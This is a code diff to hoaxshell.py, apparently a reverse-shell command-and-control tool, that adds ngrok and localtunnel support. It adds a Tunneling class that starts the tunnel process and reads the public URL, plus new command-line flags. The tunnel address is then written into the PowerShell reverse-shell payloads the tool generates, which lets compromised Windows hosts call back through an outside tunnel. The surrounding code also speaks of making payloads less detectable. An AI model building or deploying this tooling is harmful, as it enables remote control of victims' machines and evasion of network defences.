@@ -12,7 +12,7 @@ from IPython.display import display
 from threading import Thread, Event
 from time import sleep
 from ipaddress import ip_address
-from subprocess import check_output
+from subprocess import check_output, Popen, PIPE
 from string import ascii_uppercase, ascii_lowercase
 
 filterwarnings("ignore", category = DeprecationWarning)
@@ -33,7 +33,6 @@ WARN = f'{ORANGE}Warning{END}'
 IMPORTANT = WARN = f'{ORANGE}Important{END}'
 FAILED = f'{RED}Fail{END}'
 DEBUG = f'{ORANGE}Debug{END}'
-
 
 # -------------- Arguments & Usage -------------- #
 parser = argparse.ArgumentParser(
@@ -65,6 +64,14 @@ Usage examples:
   
      sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>
 
+  - Encrypted shell session with a tunneling tools:
+  
+     sudo python3 hoaxshell.py -lt 
+
+	 OR 
+
+     sudo python3 hoaxshell.py -ng
+
 
 '''
 )
@@ -81,6 +88,8 @@ parser.add_argument("-r", "--raw-payload", action="store_true", help = "Generate
 parser.add_argument("-v", "--server-version", action="store", help = "Provide a value for the \"Server\" response header (default: Apache/2.4.1)")
 parser.add_argument("-g", "--grab", action="store_true", help = "Attempts to restore a live session (default: false).")
 parser.add_argument("-t", "--trusted-domain", action="store_true", help = "If you own a domain, use this option to generate a shorter and less detectable https payload by providing your DN with -s along with a trusted certificate (-c cert.pem -k privkey.pem). See usage examples for more details.")
+parser.add_argument("-lt", "--localtunnel", action="store_true", help="Generate Payload with localtunnel")
+parser.add_argument("-ng", "--ngrok", action="store_true",help="Generate Payload with Ngrok")
 parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
 parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
 
@@ -205,12 +214,89 @@ prompt = "hoaxshell > "
 quiet = True if args.quiet else False
 frequency = args.frequency if args.frequency else 0.8
 stop_event = Event()
+t_process = None
+
 
 def rst_prompt(force_rst = False, prompt = prompt, prefix = '\r'):
 
 	if Hoaxshell.rst_promt_required or force_rst:
 		sys.stdout.write(prefix + prompt + readline.get_line_buffer())
 		Hoaxshell.rst_promt_required = False
+
+
+# -------------- Tunneling Server -------------- #
+class Tunneling:
+
+	def __init__(self, port):
+
+		'''Initialization of Tunnel Process'''
+
+		localtunnel = ['lt', '-p', str(port)]
+		ngrok = ['ngrok', 'http', str(port), '--log', 'stdout']
+
+		if args.ngrok:
+			self.__start(ngrok)
+		elif args.localtunnel:
+			self.__start(localtunnel)
+	
+	def __start(self, command):
+		'''Start Tunneling Process'''
+		try:
+			self.process = Popen(
+				command,
+				stdin=PIPE,
+				stdout=PIPE,
+				stderr=PIPE)
+		except FileNotFoundError:
+
+			if args.localtunnel:
+
+				exit_with_msg(f"Please install LocalTunnel using the instructions at https://localtunnel.me")
+
+			elif args.ngrok:
+
+				exit_with_msg(f"Please install Ngrok using the instructions at https://ngrok.com")
+
+	def lt_address(self):
+		'''LocalTunnel Address'''
+
+		output = self.process.stdout.readline().decode("utf-8").strip()
+
+		try:
+		
+			if output and "your url is" in output:
+				return output.replace('your url is: https://', '')
+
+			else:
+				self.process.kill()
+				exit_with_msg(f"{output}")
+		except Exception as ex:
+			exit_with_msg(ex)
+	
+	def ngrok_address(self):
+		'''Ngrok Address'''
+
+		try:
+			#sleep(5) #wait until ngrok get start
+			while True:
+				output = self.process.stdout.readline().decode("utf-8").strip()
+
+				if not output and self.process.poll() is not None:
+					break
+
+				elif 'url=' in output:
+					output = output.split('url=https://')[-1]
+					return output
+
+		except Exception as ex:
+			self.process.terminate()
+			exit_with_msg(ex)
+		
+
+	def terminate(self):
+
+		self.process.kill() #Terminate running tunnel process
+		print(f'\r[{WARN}] Tunnel terminated.')
 
 
 # -------------- Hoaxshell Server -------------- #
@@ -406,6 +492,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	def dropSession():
 
 		print(f'\r[{WARN}] Closing session elegantly...')
+
+		if t_process:
+			t_process.terminate()
 		
 		if not args.exec_outfile:
 			Hoaxshell.command_pool.append('exit')
@@ -424,6 +513,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				Hoaxshell.dropSession()
 
 			else:
+				if t_process:
+					t_process.terminate()
 				print(f'\r[{WARN}] Session terminated.')
 				stop_event.set()
 				sys.exit(0)
@@ -464,17 +555,17 @@ def main():
 				sys.exit(0)
 
 		# Provided options sanity check
-		if not args.server_ip and args.update and len(sys.argv) == 2:
+		if not args.server_ip and args.update and len(sys.argv) == 2 and not (args.localtunnel or args.ngrok):
 			sys.exit(0)
 
-		if not args.server_ip and args.update and len(sys.argv) > 2:
-			exit_with_msg('Local host ip not provided (-s)')
+		if not args.server_ip and args.update and len(sys.argv) > 2 and not (args.localtunnel or args.ngrok):
+			exit_with_msg('Local host ip or Tunnel not provided (use -s for IP / -lt or -ng for Tunneling)')
 
-		elif not args.server_ip and not args.update:
-			exit_with_msg('Local host ip not provided (-s)')
+		elif not args.server_ip and not args.update and not (args.localtunnel or args.ngrok):
+			exit_with_msg('Local host ip or Tunnel not provided (use -s for IP / -lt or -ng for Tunneling)')
 
 		else:
-			if not args.trusted_domain:
+			if not args.trusted_domain and not (args.localtunnel or args.ngrok):
 				# Check if provided ip is valid
 				try:
 					ip_object = ip_address(args.server_ip)
@@ -497,6 +588,23 @@ def main():
 			server_port = int(args.port) if args.port else 443
 		else:
 			server_port = int(args.port) if args.port else 8080
+
+		# Server IP
+
+		server_ip = f'{args.server_ip}:{server_port}'
+		
+		# Tunneling
+		global t_process
+		tunneling = False
+		
+		if args.localtunnel or args.ngrok:
+			tunneling = True
+
+			t_process = Tunneling(server_port) #will start tunnel process accordingly
+			if args.localtunnel:
+				t_server = t_process.lt_address()
+			elif args.ngrok:
+				t_server = t_process.ngrok_address()
 
 		try:
 			httpd = HTTPServer(('0.0.0.0', server_port), Hoaxshell)
@@ -524,8 +632,16 @@ def main():
 		# Generate payload
 		if not args.grab:
 			print(f'[{INFO}] Generating reverse shell payload...')
-			
-			if not ssl_support:
+
+			if args.localtunnel:
+				source = open('./https_payload_localtunnel.ps1',
+				              'r') if not args.exec_outfile else open('./https_payload_localtunnel_outfile.ps1', 'r')
+
+			elif args.ngrok:
+				source = open('./https_payload_ngrok.ps1',
+				              'r') if not args.exec_outfile else open('./https_payload_ngrok_outfile.ps1', 'r')
+
+			elif not ssl_support:
 				source = open('./http_payload.ps1', 'r') if not args.exec_outfile else open('./http_payload_outfile.ps1', 'r')
 			
 			elif ssl_support and args.trusted_domain:
@@ -536,7 +652,8 @@ def main():
 			
 			payload = source.read().strip()
 			source.close()
-			payload = payload.replace('*SERVERIP*', f'{args.server_ip}:{server_port}').replace('*SESSIONID*', Hoaxshell.SESSIONID).replace('*FREQ*', str(frequency)).replace('*VERIFY*', Hoaxshell.verify).replace('*GETCMD*', Hoaxshell.get_cmd).replace('*POSTRES*', Hoaxshell.post_res).replace('*HOAXID*', Hoaxshell.header_id)
+			payload = payload.replace('*SERVERIP*', (t_server if (args.localtunnel or args.ngrok) else server_ip)).replace('*SESSIONID*', Hoaxshell.SESSIONID).replace('*FREQ*', str(
+				frequency)).replace('*VERIFY*', Hoaxshell.verify).replace('*GETCMD*', Hoaxshell.get_cmd).replace('*POSTRES*', Hoaxshell.post_res).replace('*HOAXID*', Hoaxshell.header_id)
 			
 			if args.invoke_restmethod:
 				payload = payload.replace("Invoke-WebRequest", "Invoke-RestMethod").replace(".Content", "")		
@@ -545,6 +662,11 @@ def main():
 				payload = payload.replace("*OUTFILE*", args.exec_outfile)
 			
 			encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')
+
+			print(f'[{INFO}] Tunneling [{BOLD}{ORANGE}ON{END}]') if tunneling else chill()
+			
+			if tunneling:
+				print(f'[{INFO}] Server Address: {BOLD}{BLUE}{t_server}{END}')
 
 			print(f'[{INFO}] Type "help" to get a list of the available prompt commands.')
 			print(f'[{INFO}] Https Server started on port {server_port}.') if ssl_support else print(f'[{INFO}] Http Server started on port {server_port}.')
